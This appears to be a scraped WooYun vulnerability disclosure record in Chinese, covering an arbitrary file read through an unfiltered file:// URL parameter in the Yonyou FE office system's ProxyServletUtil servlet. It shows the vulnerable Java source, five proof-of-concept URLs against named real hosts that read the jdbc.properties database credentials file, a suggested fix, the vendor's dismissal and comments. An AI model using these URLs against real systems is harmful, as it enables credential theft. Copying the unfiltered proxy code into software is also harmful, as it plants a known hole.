{"id": 60, "wybug_id": "wooyun-2014-082455", "wybug_title": "用友FE协作办公系统FILE协议文件读取漏洞(通杀全版本)", "wybug_corp": "用友软件", "wybug_author": "error", "wybug_date": "2014-11-07 22:40", "wybug_open_date": "2014-11-12 22:42", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "安全意识不足", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-12：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 用友FE协作办公系统某处协议处理接口未过滤file://协议，导致任意文件读取漏洞,通杀全版本 详细说明：  \nweb.xml有如下配置：    <servlet>        <servlet-name>ProxyServletUtil</servlet-name>        <servlet-class>fe.witmanage.service.ProxyServletUtil</servlet-class>    </servlet>    <servlet-mapping>        <servlet-name>ProxyServletUtil</servlet-name>        <url-pattern>/ProxyServletUtil</url-pattern>    </servlet-mapping>\n\nProxyServletUtil.java源码如下:/*    */   public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException/*    */   {/* 23 */     String urlString = request.getParameter(\"url\");/* 24 */     writeResponse(response, urlString);/*    */   }/*    */ /*    */   private void writeResponse(HttpServletResponse response, String urlString) throws ServletException {/*    */     try {/* 29 */       URL url = new URL(urlString);/* 30 */       URLConnection urlConnection = url.openConnection();/* 31 */       response.setContentType(urlConnection.getContentType());/* 32 */       InputStream ins = urlConnection.getInputStream();/* 33 */       OutputStream outs = response.getOutputStream();/* 34 */       byte[] buffer = new byte[this.READ_BUFFER_SIZE];/* 35 */       int bytesRead = 0;/* 36 */       while ((bytesRead = ins.read(buffer, 0, this.READ_BUFFER_SIZE)) != -1) {/* 37 */         outs.write(buffer, 0, bytesRead);/*    */       }/* 39 */       System.out.println(outs);/* 40 */       outs.flush();/* 41 */       outs.close();/* 42 */       ins.close();/*    */     } catch (Exception e) {/*    */       try {/* 45 */         response.sendError(500, e.getMessage());/*    */       } catch (IOException ioe) {/* 47 */         throw new ServletException(ioe);/*    */       }/*    */     }/*    */   }/*    */ }\n\n\n\nurl参数可控并且无任何过滤，导致任意文件，由于代码逻辑，进行文件读取时需要使用file://协议来利用\n   漏洞证明：  \n(1)http://oa.hzuf.com:9090/ProxyServletUtil?url=file:///d:/FE/jboss/server/default/deploy/fe.war/WEB-INF/classes/jdbc.properties \n\n(2)http://fsd2014.f3322.org:9090/ProxyServletUtil?url=file:///d:/FE/jboss/server/default/deploy/fe.war/WEB-INF/classes/jdbc.properties\n\n\n\n(3)http://183.129.249.246:9090/ProxyServletUtil?url=file:///d:/FE/jboss/server/default/deploy/fe.war/WEB-INF/classes/jdbc.properties \n\n\n\n(4)http://218.205.208.22:9090/ProxyServletUtil?url=file:///d:/FE/jboss/server/default/deploy/fe.war/WEB-INF/classes/jdbc.properties\n\n\n\n(5)http://120.196.116.3:7321/ProxyServletUtil?url=file:///d:/FE/jboss/server/default/deploy/fe.war/WEB-INF/classes/jdbc.properties\n\n\n\n\n   修复方案：  file://协议过滤   版权声明：转载请注明来源 error@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-11-12 22:42 厂商回复：  最新状态： 2014-11-20：各位大黑阔、白帽子小伙伴，非常感谢大家对用友产品的关注。需要说明的是，\"FE协作办公平台\"早已不在用友产品体系，乃是“珠海飞企软件有限公司”所有。还请各位小伙伴明察。  ", "replys": "漏洞评价：\n评论\n     2014-11-08 08:27 |    \t\t老和尚 \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:45        | 总有一天，我会骑着雨牛@'雨。踩着一哥@jan...)\t\t \n  唉    \n     2014-11-08 08:43 |    \t\tabaddon \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:10        | 我叫什么名字)\t\t \n  一声叹息    \n     2014-11-12 23:47 |    \t\t老胖子 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:3        )\t\t \n  大牛    \n     2014-11-13 09:05 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  了解    \n     2014-12-16 11:40 |    \t\tFire ant \t\t\t( 实习白帽子  |\t\t\t        Rank:73 漏洞数:26        | 他们回来了................)\t\t \n  我觉得怎么爆路径是个问题.........    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}